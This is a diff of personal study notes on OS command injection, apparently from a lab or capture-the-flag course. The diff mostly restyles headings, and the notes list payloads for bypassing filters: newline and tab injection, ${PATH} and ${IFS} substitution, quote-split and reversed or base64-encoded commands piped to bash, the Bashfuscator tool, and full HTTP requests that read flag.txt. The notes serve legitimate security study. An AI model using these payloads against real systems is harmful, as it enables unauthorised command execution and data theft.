@@ -33,14 +33,14 @@
 | Header Injection                        | `\n` `\r\n` `\t` `%0d` `%0a` `%09`                |
 - 127.0.0.1%0als (worked)
 
-### Space Filter 
+### <span style="color:#50FA7B">Space Filter</span>
 
 - `127.0.0.1%0als%09-la`  (Spaces)
 	- `127.0.0.1` → valid input for the ping
 	- `%0a` → newline operator to start a new command
 	- `ls%09-la` → `ls -la` using a **tab** instead of space
 
-### Bypassing Other Blacklisted Characters
+### <span style="color:#50FA7B">Bypassing Other Blacklisted Characters</span>
 - `echo ${PATH}` gives us the output  `/usr/local/bin:/usr/bin:/bin:/usr/games`
 So, if we start at the `0` character, and only take a string of length `1`, we will end up with only the `/` character, which we can use in our payload:
 - `echo ${PATH:0:1}` gives us the output  `/`
@@ -51,7 +51,7 @@ similarly
 - `${IFS}${PATH:0:1}`(worked)
 - `${PATH:0:1}` (worked)
 
-# Bypassing Blacklisted Commands
+# <span style="color:#FF5555">Bypassing Blacklisted Commands</span>
 
 
 - `w'h'o'am'i` (Linux & Windows)
@@ -63,7 +63,7 @@ similarly
 example worked 
 `ip=127.0.0.1%0ac'a't%09${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt`
 
-# Advanced Command Obfuscation
+# <span style="color:#FF5555">Advanced Command Obfuscation</span>
 
 - `WhOaMi`
 - `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`
@@ -86,7 +86,7 @@ ip=127.0.0.1%0a$(rev<<<'hsab')<<<$($(rev<<<'46esab')${IFS}-d<<<ZmluZCAvdXNyL3NoY
 ````
 
 
-# Evasion Tools
+# <span style="color:#FF5555">Evasion Tools</span>
 
 ```bash
 git clone https://github.com/Bashfuscator/Bashfuscator
@@ -97,7 +97,7 @@ python3 setup.py install --user
 ```
 
 
-## # Skills Assessment
+## <span style="color:#8BE9FD">Skills Assessment</span>
 
 `%26$()'l's` worked as of full request is below
 
@@ -105,7 +105,7 @@ python3 setup.py install --user
 GET /index.php?to=tmp%26$()'l's&from=2561732172.txt&finish=1&move=1 HTTP/1.1
 ```
 
-#### Flag
+#### <span style="color:#FFB86C">Flag</span>
 ```
 GET /index.php?to=tmp%26$()c'a't${IFS}${PATH:0:1}flag.txt&from=2561732172.txt&finish=1&move=1 HTTP/1.1
 ```
